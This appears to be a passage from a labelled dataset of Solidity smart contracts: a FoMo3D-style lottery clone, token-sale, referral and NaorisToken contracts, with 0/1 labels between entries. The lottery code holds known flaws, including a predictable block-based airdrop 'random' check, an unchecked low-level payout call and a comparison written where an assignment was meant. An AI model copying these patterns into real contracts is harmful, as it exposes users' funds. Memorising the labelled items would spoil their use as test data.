_eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );                 } else {                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }         function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }         function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;        if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }         function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                 if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(50)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                 } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }         function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }         function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public        view        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];        return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                 } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)            {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                    plyr_[_pID].name,                    msg.value,                    _eventData_.compressedData,                    _eventData_.compressedIDs,                    _eventData_.winnerAddr,                    _eventData_.winnerName,                    _eventData_.amountWon,                    _eventData_.newPot,                    _eventData_.P3DAmount,                    _eventData_.genAmount                );            }                         plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                         core(_rID, _pID, _eth, _affID, _team, _eventData_);                 } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                 if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 5000000000000000000)        {            uint256 _availableLimit = (5000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                 if (_eth > 1000000000)        {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;            if (round_[_rID].team != _team)                round_[_rID].team = _team;                         _eventData_.compressedData = _eventData_.compressedData + 100;        }                         if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                 airDropTracker_ = 0;            }        }                         _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                         round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);             		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }         function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }         function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                         pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;            if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }            if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                         _eventData_.compressedData = _eventData_.compressedData + 1;        }        return (_eventData_);    }         function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }         function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                 plyr_[_pID].lrnd = rID_;                 _eventData_.compressedData = _eventData_.compressedData + 10;        return(_eventData_);    }         function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                 uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                 uint256 _pot = round_[_rID].pot;                          uint256 _win = (_pot.mul(48)) / 100;          uint256 _com = (_pot / 50);          _win = _win+_com;          uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                 plyr_[_winPID].win = _win.add(plyr_[_winPID].win);        action.redistribution.value(_p3d).gas(1000000)();                   round_[_rID].mask = _ppt.add(round_[_rID].mask);                 _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = _p3d;        _eventData_.newPot = _res;                 rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;        return(_eventData_);    }         function updateGenVault(uint256 _pID, uint256 _rIDlast)        private    {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }         function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                 uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                 if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }         function airdrop()        private        view        returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(            (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)        )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _p1 = _eth / 100;          uint256 _com = _eth / 50;           _com = _com.add(_p1);          uint256 _p3d;        if (!address(admin).call.value(_com)())        {                                                                                          _p3d = _com;            _com = 0;        }                 uint256 _aff = _eth / 10;                          if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _p3d = _aff;        }                 _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));        if (_p3d > 0)        {            action.redistribution.value(_p3d).gas(1000000)();                         _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }        return(_eventData_);    }    function potSwap()        external        payable    {                 uint256 _rID = rID_ + 1;        round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit F3Devents.onPotSwapDeposit(_rID, msg.value);    }         function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                 uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                 _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));                 uint256 _pot = _eth.sub(_gen);                          uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                 round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                 _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;        return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                          uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                          uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                 return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }         function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                 uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }         function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);        emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(msg.sender == admin);                 require(activated_ == false);                 activated_ = true;                 rID_ = 1;            round_[1].strt = now + rndExtra_ - rndGap_;            round_[1].end = now + rndInit_ + rndExtra_;    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcShort {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)        internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }         function eth(uint256 _keys)        internal        pure        returns(uint256)    {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);}library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                 require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                 bool _hasNonNumber;                 for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                         (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;            }        }        require(_hasNonNumber == true, "string cannot be only numbers");        bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {         function mul(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)    {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }         function sqrt(uint256 x)        internal        pure        returns (uint256 y)    {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)        {            y = z;            z = ((add((x / z),z)) / 2);        }    }         function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }         function pwr(uint256 x, uint256 y)        internal        pure        returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else        {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
0<CODESPLIT>contract Erc20Wrapper {    function totalSupply() public view returns (uint256);    function balanceOf(address _who) public view returns (uint256);    function transfer(address _to, uint256 _value) public returns (bool);    function transferFrom(address _from, address _to, uint256 _value) public returns (bool);    function approve(address _spender, uint256 _value) public returns (bool);    function allowance(address _owner, address _spender) public view returns (uint256);    event Transfer(address indexed _from, address indexed _to, uint256 _value);    event Approval(address indexed _owner, address indexed _spender, uint256 _value);}
1<CODESPLIT>contract LemurTokenSale is Ownable {    using SafeMath for uint256;    Erc20Wrapper public token;    address public wallet;    uint256 public rate;    uint256 public amountRaised;    uint256 public openingTime;    uint256 public closingTime;    event TokenPurchase(address indexed _purchaser, address indexed _beneficiary, uint256 _value, uint256 _amount);    constructor() public {                 openingTime = block.timestamp;        closingTime = openingTime.add(90 days);    }    function setToken(Erc20Wrapper _token) onlyOwner public {        require(_token != address(0));        token = _token;    }    function setWallet(address _wallet) onlyOwner public {        require(_wallet != address(0));        wallet = _wallet;    }    function setRate(uint256 _rate) onlyOwner public {        require(_rate > 0);        rate = _rate;    }    function setClosingTime(uint256 _days) onlyOwner public {        require(_days >= 1);        closingTime = openingTime.add(_days.mul(1 days));    }    function hasClosed() public view returns (bool) {                 return block.timestamp > closingTime;    }    function () external payable {        buyTokens(msg.sender);    }    function buyTokens(address _beneficiary) public payable {        require(!hasClosed());        require(token != address(0) && wallet != address(0) && rate > 0);        require(_beneficiary != address(0));        uint256 amount = msg.value;        require(amount >= 0.01 ether);        uint256 tokenAmount = amount.mul(rate);        amountRaised = amountRaised.add(amount);        require(token.transfer(_beneficiary, tokenAmount));        emit TokenPurchase(msg.sender, _beneficiary, amount, tokenAmount);        wallet.transfer(amount);    }}
0<CODESPLIT>contract ReferralDiscountToken is StandardToken, Owned {         mapping(address => address) referrerOf;    address[] ownersIndex;         event Referral(address indexed referred, address indexed referrer);         function referralDiscountPercentage(address _owner) public view returns (uint256 percent) {        uint256 total = 0;                 if(referrerOf[_owner] != address(0)) {            total = total.add(10);        }                 for(uint256 i = 0; i < ownersIndex.length; i++) {            if(referrerOf[ownersIndex[i]] == _owner) {                total = total.add(10);                             }        }        return total;    }                                                                                              function setReferrer(address _referred, address _referrer) onlyOwner public returns (bool success) {        require(_referrer != address(0));        require(_referrer != address(_referred));                          require(referrerOf[_referred] == address(0));        ownersIndex.push(_referred);        referrerOf[_referred] = _referrer;        emit Referral(_referred, _referrer);        return true;    }}
0<CODESPLIT>contract NaorisToken is ReferralDiscountToken {    string public constant name = "NaorisToken";    string public constant symbol = "NAO";    uint256 public constant decimals = 18;         address public saleTeamAddress;         address public referalAirdropsTokensAddress;         address public reserveFundAddress;         address public thinkTankFundAddress;         address public lockedBoardBonusAddress;         address public treasuryTimelockAddress;         bool public tokenSaleClosed = false;         uint64 date01May2019 = 1556668800;         uint256 public constant TOKENS_HARD_CAP = 400000000 * 10 ** decimals;         uint256 public constant TOKENS_SALE_HARD_CAP = 300000000 * 10 ** decimals;         uint256 public constant REFERRAL_TOKENS = 10000000 * 10 ** decimals;         uint256 public constant AIRDROP_TOKENS = 10000000 * 10 ** decimals;         uint256 public constant THINK_TANK_FUND_TOKENS = 40000000 * 10 ** decimals;         uint256 public constant NAORIS_TEAM_TOKENS = 20000000 * 10 ** decimals;         uint256 public constant LOCKED_BOARD_BONUS_TOKENS = 20000000 * 10 ** decimals;         modifier onlyTeam {        assert(msg.sender == saleTeamAddress || msg.sender == owner);        _;    }         modifier beforeEnd {        assert(!tokenSaleClosed);        _;    }    constructor(address _saleTeamAddress, address _referalAirdropsTokensAddress, address _reserveFundAddress,    address _thinkTankFundAddress, address _lockedBoardBonusAddress) public {        require(_saleTeamAddress != address(0));        require(_referalAirdropsTokensAddress != address(0));        require(_reserveFundAddress != address(0));        require(_thinkTankFundAddress != address(0));        require(_lockedBoardBonusAddress != address(0));        saleTeamAddress = _saleTeamAddress;        referalAirdropsTokensAddress = _referalAirdropsTokensAddress;        reserveFundAddress = _reserveFundAddress;        thinkTankFundAddress = _thinkTankFundAddress;        lockedBoardBonusAddress = _lockedBoardBonusAddress;                                 balances[saleTeamAddress] = TOKENS_SALE_HARD_CAP;        totalSupply_ = TOKENS_SALE_HARD_CAP;        emit Transfer(0x0, saleTeamAddress, TOKENS_SALE_HARD_CAP);                          balances[referalAirdropsTokensAddress] = REFERRAL_TOKENS;        totalSupply_ = totalSupply_.add(REFERRAL_TOKENS);        emit Transfer(0x0, referalAirdropsTokensAddress, REFERRAL_TOKENS);        balances[referalAirdropsTokensAddress] = balances[referalAirdropsTokensAddress].add(AIRDROP_TOKENS);        totalSupply_ = totalSupply_.add(AIRDROP_TOKENS);        emit Transfer(0x0, referalAirdropsTokensAddress, AIRDROP_TOKENS);    }    function close() public onlyTeam beforeEnd {                 uint256 unsoldSaleTokens = balances[saleTeamAddress];        if(unsoldSaleTokens > 0) {            balances[saleTeamAddress] = 0;            totalSupply_ = totalSupply_.sub(unsoldSaleTokens);            emit Transfer(saleTeamAddress, 0x0, unsoldSaleTokens);        }                         uint256 unspentReferalAirdropTokens = balances[referalAirdropsTokensAddress];        if(unspentReferalAirdropTokens > 0) {            balances[referalAirdropsTokensAddress] = 0;            balances[reserveFundAddress] = balances[reserveFundAddress].add(unspentReferalAirdropTokens);            emit Transfer(referalAirdropsTokensAddress, reserveFundAddress, unspentReferalAirdropTokens);        }                         balances[thinkTankFundAddress] = balances[thinkTankFundAddress].add(THINK_TANK_FUND_TOKENS);        totalSupply_ = totalSupply_.add(THINK_TANK_FUND_TOKENS);        emit Transfer(0x0, thinkTankFundAddress, THINK_TANK_FUND_TOKENS);                 balances[owner] = balances[owner].add(NAORIS_TEAM_TOKENS);        totalSupply_ = totalSupply_.add(NAORIS_TEAM_TOKENS);        emit Transfer(0x0, owner, NAORIS_TEAM_TOKENS);                 TokenTimelock lockedTreasuryTokens = new TokenTimelock(this, lockedBoardBonusAddress, date01May2019);        treasuryTimelockAddress = address(lockedTreasuryTokens);        balances[treasuryTimelockAddress] = balances[treasuryTimelockAddress].add(LOCKED_BOARD_BONUS_TOKENS);        totalSupply_ = totalSupply_.add(LOCKED_BOARD_BONUS_TOKENS);        emit Transfer(0x0, treasuryTimelockAddress, LOCKED_BOARD_BONUS_TOKENS);        require(totalSupply_ <= TOKENS_HARD_CAP);        tokenSaleClosed = true;    }    function tokenDiscountPercentage(address _owner) public view returns (uint256 percent) {        if(balanceOf(_owner) >= 1000000 * 10**decimals) {            return 50;        } else if(balanceOf(_owner) >= 500000 * 10**decimals) {            return 30;        } else if(balanceOf(_owner) >= 250000 * 10**decimals) {            return 25;        } else 